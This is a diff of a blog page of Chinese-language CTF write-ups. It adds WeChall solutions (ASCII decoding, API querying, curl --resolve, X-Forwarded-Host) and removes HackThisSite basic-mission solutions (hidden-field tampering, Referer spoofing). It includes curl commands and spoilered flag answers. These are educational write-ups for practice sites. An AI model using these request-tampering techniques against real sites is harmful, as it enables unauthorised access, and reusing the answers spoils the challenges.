       </span>
       <span class="post-meta-item-text">Posted on</span>
 
-      <time title="Created: 2026-06-08 21:59:27" itemprop="dateCreated datePublished" datetime="2026-06-08T21:59:27+08:00">2026-06-08</time>
+      <time title="Created: 2026-06-10 12:54:26" itemprop="dateCreated datePublished" datetime="2026-06-10T12:54:26+08:00">2026-06-10</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2026-09-15 09:52:09" itemprop="dateModified" datetime="2026-09-15T09:52:09+08:00">2026-09-15</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/ctf/" itemprop="url" rel="index"><span itemprop="name">ctf</span></a>
+        </span>
+    </span>
+
+  
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Disqus: </span>
+    
+    <a title="disqus" href="/wp/WeChall/wechall-2021-christmas-hippety/#disqus_thread" itemprop="discussionUrl">
+      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="wp/WeChall/wechall-2021-christmas-hippety/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h3 id="challenge">Challenge</h3>
+<p><strong>2021 Christmas Hippety (Stegano, Javascript)</strong> --
+score: 1</p>
+<blockquote>
+<p>The Easter Bunny is angry, because he hates winter and has to wait so
+long for easter season and the sun. Can you calm him down? We wish you a
+merry Christmas 2021!</p>
+</blockquote>
+<h3 id="solution">Solution</h3>
+<p><strong>Step 1: 查看页面源码</strong></p>
+<p>页面描述中 "angry" 是一个可点击链接。HTML 源码揭示了两层意图：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">The <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;/profile/EasterBunny&quot;</span>&gt;</span>Easter Bunny<span class="tag">&lt;/<span class="name">a</span>&gt;</span> is</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;hoppety.php&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;this.href=&#x27;hop.php&#x27;&quot;</span>&gt;</span>angry<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li><code>href</code> 原本指向 <code>hoppety.php</code></li>
+<li><code>onclick</code> 在点击瞬间将目标改为
+<code>hop.php</code>，隐藏了真实路径</li>
+</ul>
+<p><strong>Step 2: 直接访问 hoppety.php</strong></p>
+<p>绕过 JS 拦截，直接请求 <code>hoppety.php</code>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ curl -s https://www.wechall.net/en/challenge/christmas2021/hippety/hoppety.php</span><br></pre></td></tr></table></figure>
+<p>返回的 301 页面中，响应体包含明文密码，同时还有另一层 JS
+重定向阻止普通访问：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="variable language_">window</span>.<span class="property">location</span>.<span class="title function_">replace</span>(<span class="string">&#x27;hop.php&#x27;</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span>HippetyHoppetyConfusion<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>这就是 <strong>Stegano</strong>
+标签的含义：信息隐藏在页面响应体中，不被用户直接看到。而
+<strong>Javascript</strong>
+标签则对应了两层误导机制（<code>onclick</code> 改 href +
+<code>window.location.replace</code> 自动跳转）。</p>
+<p><code>hop.php</code> 最终只展示一个困惑兔子的 GIF
+动画，它是纯粹的诱饵。</p>
+<p><strong>Step 3: 提交答案</strong></p>
+<span class="spoiler" onclick="this.classList.toggle('spoiler')"><span class="spoiler-blur ">HippetyHoppetyConfusion</span></span>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://vkkkv.github.io/wp/WeChall/wechall-cgx-15-still-binary/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="vkkkv">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hello Navi">
+      <meta itemprop="description" content="A blog about CTF writeups, Linux, Mathematics, Technology, and personal thoughts.">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content=" | Hello Navi">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/wp/WeChall/wechall-cgx-15-still-binary/" class="post-title-link" itemprop="url">WeChall - CGX#15 - Still Binary</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2026-06-10 12:49:22" itemprop="dateCreated datePublished" datetime="2026-06-10T12:49:22+08:00">2026-06-10</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -591,8 +989,8 @@ oracle（可以任意加密已知明文），攻击者可以通过 chosen-plaint
       </span>
       <span class="post-meta-item-text">Disqus: </span>
     
-    <a title="disqus" href="/wp/HackThisSite/hackthissite-basic-05/#disqus_thread" itemprop="discussionUrl">
-      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="wp/HackThisSite/hackthissite-basic-05/" itemprop="commentCount"></span>
+    <a title="disqus" href="/wp/WeChall/wechall-cgx-15-still-binary/#disqus_thread" itemprop="discussionUrl">
+      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="wp/WeChall/wechall-cgx-15-still-binary/" itemprop="commentCount"></span>
     </a>
   </span>
   
@@ -607,25 +1005,32 @@ oracle（可以任意加密已知明文），攻击者可以通过 chosen-plaint
     
     <div class="post-body" itemprop="articleBody">
           <h3 id="challenge">Challenge</h3>
-<blockquote>
-<p>Sam has gotten wise to all the people who wrote their own forms to
-get the password. Rather than actually learn the password, he decided to
-make his email program a little more secure.</p>
-<p>Sam
-发现很多人自己写表单来获取密码。他没有去真正学密码，而是让邮件程序变得更安全了一些。</p>
-</blockquote>
+<p>CGX#15: Still Binary 考察 7-bit
+ASCII。题目页面给出一个随机生成并绑定当前 session 的 bit
+stream，例如：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">101000010100111001100100001010000011001001100010110000111010010100010110000101010000</span><br></pre></td></tr></table></figure>
+<p>每个 session 的 bit stream 不同，不能把示例解码结果当成固定答案。</p>
 <h3 id="solution">Solution</h3>
-<p>这题和 Basic 4 基本一样，只是增加了 Referer
-验证。服务端会检查请求来源是否来自 <code>/missions/basic/5/</code>
-页面本身。</p>
-<p>解决方法完全相同——修改隐藏的 <code>to</code>
-字段，但必须同时发送正确的 Referer：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ curl -sL -b <span class="string">&#x27;HackThisSite=YOUR_COOKIE&#x27;</span> \</span><br><span class="line">    -e <span class="string">&#x27;https://www.hackthissite.org/missions/basic/5/&#x27;</span> \</span><br><span class="line">    -d <span class="string">&#x27;to=YOUR_EMAIL&#x27;</span> \</span><br><span class="line">    <span class="string">&#x27;https://www.hackthissite.org/missions/basic/5/level5.php&#x27;</span></span><br></pre></td></tr></table></figure>
-<p><code>-e</code> 参数设置 Referer header。如果不带 Referer 或 Referer
-不匹配，会返回 <code>Invalid Referer</code> 错误。</p>
-<p>核心知识点：Referer header
-同样可以被伪造。它不是安全机制，不能用来防止跨站请求。唯一可靠的防御是服务端独立验证权限。</p>
-<span class="spoiler" onclick="this.classList.toggle('spoiler')"><span class="spoiler-blur ">92bf24e2</span></span>
+<p><strong>Recon</strong>: 观察 bit stream 长度。示例 84 bit，尝试 8-bit
+分组：84 % 8 = 4（不整除）。尝试 7-bit 分组：84 % 7 = 0 → 长度能被 7
+整除。早期 ASCII 只定义 0-127，每个字符只需要 7 bit；第 8 bit
+在一些通信场景中可作为 parity bit。因此本题不是 8-bit byte
+stream，而是连续的 7-bit ASCII stream。</p>
+<p><strong>解法步骤</strong>：</p>
+<ol type="1">
+<li>从页面抓取当前 session 的 bit stream（curl 或浏览器查看源代码）</li>
+<li>检查 <code>len(bits) % 7 == 0</code></li>
+<li>每 7 bit 一组，按普通二进制 MSB→LSB 转 ASCII</li>
+<li>提交解码后的文本</li>
+</ol>
+<p>Python：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">bits = <span class="string">&#x27;101000010100111001100100001010000011001001100010110000111010010100010110000101010000&#x27;</span></span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(bits) % <span class="number">7</span> == <span class="number">0</span></span><br><span class="line">answer = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">chr</span>(<span class="built_in">int</span>(bits[i:i+<span class="number">7</span>], <span class="number">2</span>)) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(bits), <span class="number">7</span>))</span><br><span class="line"><span class="built_in">print</span>(answer)</span><br></pre></td></tr></table></figure>
+<p>本地验证示例输出为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PSLBAIECREBP</span><br></pre></td></tr></table></figure>
+<p>实际提交前要重新抓取当前 WeChall 页面并解码。</p>
+<blockquote>
+<p>session-bound: 7-bit ASCII decode, answer varies per session</p>
+</blockquote>
 
       
     </div>
@@ -652,7 +1057,7 @@ make his email program a little more secure.</p>
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="https://vkkkv.github.io/wp/HackThisSite/hackthissite-basic-04/">
+    <link itemprop="mainEntityOfPage" href="https://vkkkv.github.io/wp/WeChall/wechall-interesting/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.png">
@@ -670,7 +1075,7 @@ make his email program a little more secure.</p>
     </span>
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
-          <a href="/wp/HackThisSite/hackthissite-basic-04/" class="post-title-link" itemprop="url">HackThisSite - Basic Mission 4</a>
+          <a href="/wp/WeChall/wechall-interesting/" class="post-title-link" itemprop="url">WeChall - Interesting</a>
         </h2>
 
         <div class="post-meta-container">
@@ -681,14 +1086,14 @@ make his email program a little more secure.</p>
       </span>
       <span class="post-meta-item-text">Posted on</span>
 
-      <time title="Created: 2026-06-08 21:55:57" itemprop="dateCreated datePublished" datetime="2026-06-08T21:55:57+08:00">2026-06-08</time>
+      <time title="Created: 2026-06-10 12:35:57" itemprop="dateCreated datePublished" datetime="2026-06-10T12:35:57+08:00">2026-06-10</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">Edited on</span>
-      <time title="Modified: 2026-09-08 22:40:47" itemprop="dateModified" datetime="2026-09-08T22:40:47+08:00">2026-09-08</time>
+      <time title="Modified: 2026-09-15 10:13:03" itemprop="dateModified" datetime="2026-09-15T10:13:03+08:00">2026-09-15</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -709,8 +1114,8 @@ make his email program a little more secure.</p>
       </span>
       <span class="post-meta-item-text">Disqus: </span>
     
-    <a title="disqus" href="/wp/HackThisSite/hackthissite-basic-04/#disqus_thread" itemprop="discussionUrl">
-      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="wp/HackThisSite/hackthissite-basic-04/" itemprop="commentCount"></span>
+    <a title="disqus" href="/wp/WeChall/wechall-interesting/#disqus_thread" itemprop="discussionUrl">
+      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="wp/WeChall/wechall-interesting/" itemprop="commentCount"></span>
     </a>
   </span>
   
@@ -726,29 +1131,32 @@ make his email program a little more secure.</p>
     <div class="post-body" itemprop="articleBody">
           <h3 id="challenge">Challenge</h3>
 <blockquote>
-<p>This time Sam hardcoded the password into the script. However, the
-password is long and complex, and Sam is often forgetful. So he wrote a
-script that would email his password to him automatically in case he
-forgot.</p>
-<p>这次 Sam 把密码硬编码在脚本里了。密码很长很复杂，而 Sam
-经常忘，所以他写了一个脚本，会自动把密码发送到他的邮箱。</p>
+<p>As an easter present i have coded up a new feature. Your mission is
+to find the 9 eastereggs on the map which were hid by the
+EasterBunny.</p>
 </blockquote>
-<p>页面上有两个表单： - 一个"Send password to Sam"按钮 -
-一个密码输入框</p>
+<p>WeChall 有一个 Hackerspace 地图功能（Google
+Maps），用户可以在地图上放置标记点。需要找到 EasterBunny 用户隐藏的 9
+个彩蛋。</p>
 <h3 id="solution">Solution</h3>
-<p>查看源代码，发现"Send password to
-Sam"按钮对应的表单里有一个隐藏字段：</p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;/missions/basic/4/level4.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;to&quot;</span> <span class="attr">value</span>=<span class="string">&quot;sam@hackthissite.org&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Send password to Sam&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<p>收件人地址 <code>sam@hackthissite.org</code> 是硬编码的。只需将
-<code>to</code>
-字段的值改成你自己的邮箱地址，然后提交——密码就会发到你的邮箱。</p>
-<p><strong>修改方式</strong>： 1. 浏览器开发者工具（F12）→ Elements →
-直接修改 <code>value="sam@hackthissite.org"</code> 为你的邮箱 2. 或者用
-curl 直接 POST：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ curl -sL -b <span class="string">&#x27;HackThisSite=YOUR_COOKIE&#x27;</span> \</span><br><span class="line">    -e <span class="string">&#x27;https://www.hackthissite.org/missions/basic/4/&#x27;</span> \</span><br><span class="line">    -d <span class="string">&#x27;to=YOUR_EMAIL&#x27;</span> \</span><br><span class="line">    <span class="string">&#x27;https://www.hackthissite.org/missions/basic/4/level4.php&#x27;</span></span><br></pre></td></tr></table></figure>
-<p>然后去邮箱查收密码。</p>
-<p>客户端表单验证毫无意义。任何隐藏字段都可以被修改，任何表单都可以被自定义提交。服务端必须独立验证所有输入。</p>
-<span class="spoiler" onclick="this.classList.toggle('spoiler')"><span class="spoiler-blur ">206a6f9d</span></span>
+<p>WeChall 的地图数据通过 POI API 端点暴露。直接查询全球范围的 bounding
+box：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ curl -sL -b <span class="string">&#x27;WC=...&#x27;</span> \</span><br><span class="line">  <span class="string">&#x27;https://www.wechall.net/en/index.php?mo=Profile&amp;me=POIS&amp;minlat=-90&amp;maxlat=90&amp;minlon=-180&amp;maxlon=180&#x27;</span></span><br></pre></td></tr></table></figure>
+<p>返回所有用户的 POI 数据。过滤 EasterBunny（uid 11212）的标记，得到 9
+个彩蛋：</p>
+<ul>
+<li>acknowledge：韩国 (35.68, 127.90)</li>
+<li>beauty：复活节岛 (-27.12, -109.28)</li>
+<li>charming：巨石阵 (51.17, -1.82)</li>
+<li>depth：太平洋 (15.70, -141.62)</li>
+<li>elegance：日本 (34.52, 136.36)</li>
+<li>fantasy：南大西洋 (-52.65, 33.71)</li>
+<li>guidance：瑞典 (57.71, 11.99)</li>
+<li>hackerspace：德国 (51.73, 10.26)</li>
+<li>inspiration：埃及/吉萨 (29.97, 31.13)</li>
+</ul>
+<p>答案按字母顺序排列，逗号分隔。</p>
+<span class="spoiler" onclick="this.classList.toggle('spoiler')"><span class="spoiler-blur ">acknowledge,beauty,charming,depth,elegance,fantasy,guidance,hackerspace,inspiration</span></span>
 
       
     </div>
@@ -775,7 +1183,7 @@ curl 直接 POST：</p>
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="https://vkkkv.github.io/wp/HackThisSite/hackthissite-basic-03/">
+    <link itemprop="mainEntityOfPage" href="https://vkkkv.github.io/wp/WeChall/wechall-training-no-dns/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.png">
@@ -793,7 +1201,7 @@ curl 直接 POST：</p>
     </span>
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
-          <a href="/wp/HackThisSite/hackthissite-basic-03/" class="post-title-link" itemprop="url">HackThisSite - Basic Mission 3</a>
+          <a href="/wp/WeChall/wechall-training-no-dns/" class="post-title-link" itemprop="url">WeChall - Training - No DNS</a>
         </h2>
 
         <div class="post-meta-container">
@@ -804,14 +1212,14 @@ curl 直接 POST：</p>
       </span>
       <span class="post-meta-item-text">Posted on</span>
 
-      <time title="Created: 2026-06-08 21:37:36" itemprop="dateCreated datePublished" datetime="2026-06-08T21:37:36+08:00">2026-06-08</time>
+      <time title="Created: 2026-06-10 12:34:41" itemprop="dateCreated datePublished" datetime="2026-06-10T12:34:41+08:00">2026-06-10</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">Edited on</span>
-      <time title="Modified: 2026-09-08 22:40:47" itemprop="dateModified" datetime="2026-09-08T22:40:47+08:00">2026-09-08</time>
+      <time title="Modified: 2026-09-15 10:09:08" itemprop="dateModified" datetime="2026-09-15T10:09:08+08:00">2026-09-15</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -832,8 +1240,8 @@ curl 直接 POST：</p>
       </span>
       <span class="post-meta-item-text">Disqus: </span>
     
-    <a title="disqus" href="/wp/HackThisSite/hackthissite-basic-03/#disqus_thread" itemprop="discussionUrl">
-      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="wp/HackThisSite/hackthissite-basic-03/" itemprop="commentCount"></span>
+    <a title="disqus" href="/wp/WeChall/wechall-training-no-dns/#disqus_thread" itemprop="discussionUrl">
+      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="wp/WeChall/wechall-training-no-dns/" itemprop="commentCount"></span>
     </a>
   </span>
   
@@ -848,20 +1256,68 @@ curl 直接 POST：</p>
     
     <div class="post-body" itemprop="articleBody">
           <h3 id="challenge">Challenge</h3>
-<blockquote>
-<p>This time Network Security Sam remembered to upload the password
-file, but there were deeper problems than that.</p>
-<p>这次 Sam 记得上传密码文件了，但问题比这更深层。</p>
-</blockquote>
-<p>页面上有一个密码输入框。查看源代码后发现一个隐藏的表单字段：</p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> <span class="attr">value</span>=<span class="string">&quot;password.php&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure>
+<p>题目要求访问：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://make.love.not.war.com/challenge/training/net/nodns/etc/hosts.php</span><br></pre></td></tr></table></figure>
+<p>名字叫 No DNS：核心是让请求到达这个域名指向的服务器，而不依赖正常 DNS
+流程。域名 <code>make.love.not.war.com</code> 在 WeChall
+上是一个虚拟主机，需以合适方式将解析指向 WeChall 服务器。</p>
 <h3 id="solution">Solution</h3>
-<p>HTML 表单中的 <code>hidden</code>
-类型字段对用户来说完全是可见的——只要查看源代码就能看到。这里隐藏字段暴露了密码文件的路径：<code>password.php</code>。</p>
-<p>直接在浏览器中访问这个文件即可获得密码：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.hackthissite.org/missions/basic/3/password.php</span><br></pre></td></tr></table></figure>
-<p>页面会直接返回密码内容。</p>
-<span class="spoiler" onclick="this.classList.toggle('spoiler')"><span class="spoiler-blur ">e656d2bd</span></span>
+<p>用 <code>curl --resolve</code> 最干净：只影响这一条请求，不需要改系统
+<code>/etc/hosts</code>。</p>
+<p>不要在 writeup 中硬编码老 IP。WeChall 的解析 IP
+可能变化，运行时动态取当前 IP：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">IP=$(dig +short www.wechall.net A | <span class="built_in">head</span> -n1)</span><br></pre></td></tr></table></figure>
+<p>然后让 <code>curl</code> 对目标域名使用这个 IP：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">curl -sk \</span><br><span class="line">  --resolve <span class="string">&quot;make.love.not.war.com:443:<span class="variable">$IP</span>&quot;</span> \</span><br><span class="line">  -b <span class="string">&#x27;WC=...&#x27;</span> \</span><br><span class="line">  <span class="string">&#x27;https://make.love.not.war.com/challenge/training/net/nodns/etc/hosts.php&#x27;</span></span><br></pre></td></tr></table></figure>
+<p>参数含义：</p>
+<ul>
+<li><code>--resolve HOST:PORT:IP</code>：只为当前 curl
+请求手动指定解析结果，不发起 DNS 查询</li>
+<li><code>-k</code>：忽略证书校验（证书是 wechall.net
+签发的，域名不匹配）</li>
+<li><code>-b 'WC=...'</code>：携带 WeChall 登录 cookie</li>
+</ul>
+<p>等价方法是临时写
+<code>/etc/hosts</code>，但这会修改系统状态，完成后需要恢复；优先用
+<code>--resolve</code>。</p>
+<p><strong><code>--resolve</code> 在各协议层的影响：</strong></p>
+<table>
+<thead>
+<tr>
+<th>层</th>
+<th>直接连 IP</th>
+<th><code>--resolve</code></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>DNS</td>
+<td>不查</td>
+<td><strong>不查</strong>（被 curl 的映射表劫持）</td>
+</tr>
+<tr>
+<td>TCP 目标</td>
+<td>指定的 IP</td>
+<td>指定的 IP</td>
+</tr>
+<tr>
+<td>TLS SNI</td>
+<td>IP（或无）</td>
+<td><strong>原始域名</strong> ✅</td>
+</tr>
+<tr>
+<td>HTTP Host</td>
+<td>IP</td>
+<td><strong>原始域名</strong> ✅</td>
+</tr>
+</tbody>
+</table>
+<p><code>--resolve</code> 只劫持了 DNS 解析入口：修改的是 curl
+进程自己的 DNS 缓存表，不是内核协议栈。TCP 层的目标 IP 按
+<code>--resolve</code> 指定的地址发送，但上层的 TLS SNI 和 HTTP Host
+header 都保持原始域名不变。这正是"No DNS"的精髓：不在 DNS
+层面做任何事（域名不存在），但让上层协议以为请求经过了正常解析。</p>
+<p>访问成功后页面会返回成功消息，挑战自动标记为 solved。</p>
 
       
     </div>
@@ -888,7 +1344,7 @@ file, but there were deeper problems than that.</p>
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="https://vkkkv.github.io/wp/HackThisSite/hackthissite-basic-02/">
+    <link itemprop="mainEntityOfPage" href="https://vkkkv.github.io/wp/WeChall/wechall-host-me/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.png">
@@ -906,7 +1362,7 @@ file, but there were deeper problems than that.</p>
     </span>
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
-          <a href="/wp/HackThisSite/hackthissite-basic-02/" class="post-title-link" itemprop="url">HackThisSite - Basic Mission 2</a>
+          <a href="/wp/WeChall/wechall-host-me/" class="post-title-link" itemprop="url">WeChall - HOST me</a>
         </h2>
 
         <div class="post-meta-container">
@@ -917,14 +1373,14 @@ file, but there were deeper problems than that.</p>
       </span>
       <span class="post-meta-item-text">Posted on</span>
 
-      <time title="Created: 2026-06-08 21:35:15" itemprop="dateCreated datePublished" datetime="2026-06-08T21:35:15+08:00">2026-06-08</time>
+      <time title="Created: 2026-06-10 12:22:32" itemprop="dateCreated datePublished" datetime="2026-06-10T12:22:32+08:00">2026-06-10</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">Edited on</span>
-      <time title="Modified: 2026-09-08 22:40:47" itemprop="dateModified" datetime="2026-09-08T22:40:47+08:00">2026-09-08</time>
+      <time title="Modified: 2026-09-15 09:54:44" itemprop="dateModified" datetime="2026-09-15T09:54:44+08:00">2026-09-15</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -945,8 +1401,8 @@ file, but there were deeper problems than that.</p>
       </span>
       <span class="post-meta-item-text">Disqus: </span>
     
-    <a title="disqus" href="/wp/HackThisSite/hackthissite-basic-02/#disqus_thread" itemprop="discussionUrl">
-      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="wp/HackThisSite/hackthissite-basic-02/" itemprop="commentCount"></span>
+    <a title="disqus" href="/wp/WeChall/wechall-host-me/#disqus_thread" itemprop="discussionUrl">
+      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="wp/WeChall/wechall-host-me/" itemprop="commentCount"></span>
     </a>
   </span>
   
@@ -961,19 +1417,17 @@ file, but there were deeper problems than that.</p>
     
     <div class="post-body" itemprop="articleBody">
           <h3 id="challenge">Challenge</h3>
-<blockquote>
-<p>Network Security Sam set up a password protection script. He made it
-load the real password from an unencrypted text file and compare it to
-the password the user enters. However, he neglected to upload the
-password file...</p>
-<p>Sam
-设置了一个密码保护脚本，从一个未加密的文本文件中加载真实密码进行比对。然而他忘了上传密码文件。</p>
-</blockquote>
+<p>HTTP Host header 攻击。需要利用 Host
+头操纵来触发服务器端的虚拟主机访问或密码重置逻辑。</p>
 <h3 id="solution">Solution</h3>
-<p>这道题考察的是逻辑思维。脚本从文件加载密码来比对用户输入。如果密码文件不存在，脚本就无法加载任何内容来比对。</p>
-<p>当你提交一个空密码时，脚本试图将空字符串与一个不存在的文件内容比对——两者都是空值，所以比对通过。</p>
-<p>直接在密码框中什么都不输入，点击 submit 即可。</p>
-<p>核心知识点：如果密码文件缺失，认证系统可能默认接受任何输入（甚至空输入）。实际部署中应该对文件缺失的情况做防御性处理。</p>
+<p>目标 URL 是 <code>/en/challenge/space/host_me/index.php</code>。</p>
+<p>普通的 <code>Host</code> 头修改不够：服务器或反向代理通过
+<code>X-Forwarded-Host</code> 头来决定实际路由的目标虚拟主机。发送
+<code>X-Forwarded-Host: localhost</code>
+头部，使服务器认为请求目标是本地服务，从而触发解题条件。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ curl -b <span class="string">&#x27;WC=...&#x27;</span> \</span><br><span class="line">  -H <span class="string">&#x27;X-Forwarded-Host: localhost&#x27;</span> \</span><br><span class="line">  <span class="string">&#x27;https://www.wechall.net/en/challenge/space/host_me/index.php&#x27;</span></span><br></pre></td></tr></table></figure>
+<p>注意 <code>X-Forwarded-Host</code> 不是 <code>--resolve</code>（那是
+DNS 解析层面），这里的攻击点位于 HTTP 代理层对上游 Host 的信任。</p>
 
       
     </div>
@@ -1000,7 +1454,7 @@ password file...</p>
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="https://vkkkv.github.io/wp/HackThisSite/hackthissite-basic-01/">
+    <link itemprop="mainEntityOfPage" href="https://vkkkv.github.io/wp/WeChall/wechall-blinded-by-the-light/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.png">
@@ -1018,7 +1472,7 @@ password file...</p>
     </span>
       <header class="post-header">
